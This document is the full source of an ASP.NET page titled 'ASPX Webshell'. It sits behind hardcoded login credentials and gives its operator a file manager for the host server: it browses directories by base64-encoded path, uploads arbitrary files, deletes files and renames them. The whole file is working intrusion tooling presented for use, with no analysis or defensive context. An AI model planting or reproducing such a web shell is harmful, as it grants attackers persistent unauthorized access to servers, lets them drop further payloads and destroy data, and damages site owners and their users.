<%@ Page Language="C#" AutoEventWireup="true" %>

<script runat="server">

    private const string AUTH_USER = "samriddhi";
    private const string AUTH_PASS = "bikustilllovesher";

    protected bool IsAuthenticated
    {
        get { return Session["authenticated"] != null && (bool)Session["authenticated"]; }
        set { Session["authenticated"] = value; }
    }

    protected string CurrentPath
    {
        get
        {
            if (ViewState["CurrentPath"] == null)
            {
                ViewState["CurrentPath"] = Server.MapPath("~");
            }
            return ViewState["CurrentPath"].ToString();
        }
        set
        {
            ViewState["CurrentPath"] = value;
        }
    }

    protected string LoginError = "";

    protected void Page_Load(object sender, EventArgs e)
    {
        if (Request.QueryString["exit"] != null)
        {
            Session.Abandon();
            Response.Redirect(Request.Path);
            return;
        }

        if (!IsAuthenticated)
        {
            if (IsPostBack && Request.Form["auth"] != null)
            {
                string user = Request.Form["user"];
                string pass = Request.Form["pass"];
                if (user == AUTH_USER && pass == AUTH_PASS)
                {
                    IsAuthenticated = true;
                    Response.Redirect(Request.Path);
                    return;
                }
                else
                {
                    LoginError = "Access Denied!";
                }
            }
        }
        else
        {
            if (IsPostBack)
            {
                // Change directory path
                if (!string.IsNullOrEmpty(Request.Form["path"]))
                {
                    string decodedPath = DecodeBase64(Request.Form["path"]);
                    if (System.IO.Directory.Exists(decodedPath))
                    {
                        CurrentPath = decodedPath;
                    }
                }
                
                // Upload file
                if (Request.Files.Count > 0)
                {
                    var uploadedFile = Request.Files["file_data"];
                    if (uploadedFile != null && uploadedFile.ContentLength > 0)
                    {
                        var targetFilePath = System.IO.Path.Combine(CurrentPath, System.IO.Path.GetFileName(uploadedFile.FileName));
                        uploadedFile.SaveAs(targetFilePath);
                        Response.Write("File uploaded successfully!<br />");
                    }
                }

                // Remove file
                if (!string.IsNullOrEmpty(Request.Form["remove_file"]))
                {
                    var targetFile = DecodeBase64(Request.Form["remove_file"]);
                    if (System.IO.File.Exists(targetFile))
                    {
                        try
                        {
                            System.IO.File.Delete(targetFile);
                            Response.Write("File removed!<br />");
                        }
                        catch
                        {
                            Response.Write("Removal failed or no permission!<br />");
                        }
                    }
                }

                // Rename file
                if (!string.IsNullOrEmpty(Request.Form["rename_file"]) && !string.IsNullOrEmpty(Request.Form["new_name"]))
                {
                    var originalPath = DecodeBase64(Request.Form["rename_file"]);
                    var parentDir = System.IO.Path.GetDirectoryName(originalPath);
                    var newFullPath = System.IO.Path.Combine(parentDir, Request.Form["new_name"]);

                    if (System.IO.File.Exists(originalPath) && !System.IO.File.Exists(newFullPath))
                    {
                        try
                        {
                            System.IO.File.Move(originalPath, newFullPath);
                            Response.Write("File renamed!<br />");
                        }
                        catch
                        {
                            Response.Write("Rename failed!<br />");
                        }
                    }
                }
            }
        }
    }

    protected string EncodeBase64(string data)
    {
        return Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(data));
    }

    protected string DecodeBase64(string data)
    {
        try
        {
            byte[] bytes = Convert.FromBase64String(data);
            return System.Text.Encoding.UTF8.GetString(bytes);
        }
        catch
        {
            return "";
        }
    }
</script>

<html>
<head>
    <title>ASPX Webshell</title>
</head>
<body>
    <% if (!IsAuthenticated) { %>
        <form method="post">
            <h2>Login</h2>
            <input type="text" name="user" placeholder="Username" required autofocus /><br />
            <input type="password" name="pass" placeholder="Password" required /><br />
            <button type="submit" name="auth">Login</button>
            <br /><font color="red"><%= LoginError %></font>
        </form>
    <% } else { %>
        <p>Active User: samriddhi | <a href="?exit=1">Logout</a></p>
        <h3>Current Path: <%= Server.HtmlEncode(CurrentPath) %></h3>

        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file_data" required />
            <input type="hidden" name="path" value="<%= EncodeBase64(CurrentPath) %>" />
            <button type="submit">Upload File</button>
        </form>

        <form method="post">
            <input type="hidden" id="pathInput" name="path" value="<%= EncodeBase64(CurrentPath) %>" />
        </form>

        <table border="1" cellpadding="5" cellspacing="0" style="width:100%; margin-top:20px;">
            <tr><th>Name</th><th>Size</th><th>Modified</th><th>Actions</th></tr>
            <% 
                if (System.IO.Directory.Exists(CurrentPath))
                {
                    var dir = new System.IO.DirectoryInfo(CurrentPath);
                    var entries = dir.GetFileSystemInfos();
                    foreach (var entry in entries)
                    {
                        string name = entry.Name + (entry.Attributes.HasFlag(System.IO.FileAttributes.Directory) ? "/" : "");
                        long size = entry.Attributes.HasFlag(System.IO.FileAttributes.Directory) ? -1 : ((System.IO.FileInfo)entry).Length;
                        string modified = entry.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss");
                        string encodedPath = EncodeBase64(entry.FullName);

                        Response.Write("<tr>");
                        Response.Write("<td>");
                        if (entry.Attributes.HasFlag(System.IO.FileAttributes.Directory))
                        {
                            Response.Write("<a href=\"#\" onclick=\"navigate('" + entry.FullName.Replace("\\", "/") + "')\">" + Server.HtmlEncode(name) + "</a>");
                        }
                        else
                        {
                            Response.Write(Server.HtmlEncode(name));
                        }
                        Response.Write("</td>");
                        Response.Write("<td>" + (size == -1 ? "-" : size.ToString()) + "</td>");
                        Response.Write("<td>" + modified + "</td>");
                        Response.Write("<td>");
                        if (!entry.Attributes.HasFlag(System.IO.FileAttributes.Directory))
                        {
                            Response.Write("<form style='display:inline;' method='post'><button name='edit_file' value='" + encodedPath + "'>Edit</button></form>");
                            Response.Write("<form style='display:inline;' method='post'><input type='hidden' name='rename_file' value='" + encodedPath + "' /><button type='submit'>Rename</button></form>");
                            Response.Write("<form style='display:inline;' method='post' onsubmit='return confirm(\"Delete this file?\");'><input type='hidden' name='remove_file' value='" + encodedPath + "' /><button type='submit'>Delete</button></form>");
                        }
                        else
                        {
                            Response.Write("&nbsp;");
                        }
                        Response.Write("</td>");
                        Response.Write("</tr>");
                    }
                }
                else
                {
                    Response.Write("<tr><td colspan=\"4\">Cannot access directory.</td></tr>");
                }
            %>
        </table>

        <script>
            function navigate(path) {
                var form = document.createElement('form');
                form.method = 'post';
                form.action = '';
                var input = document.createElement('input');
                input.type = 'hidden';
                input.name = 'path';
                input.value = btoa(path);
                form.appendChild(input);
                document.body.appendChild(form);
                form.submit();
            }
        </script>
    <% } %>
</body>
</html>
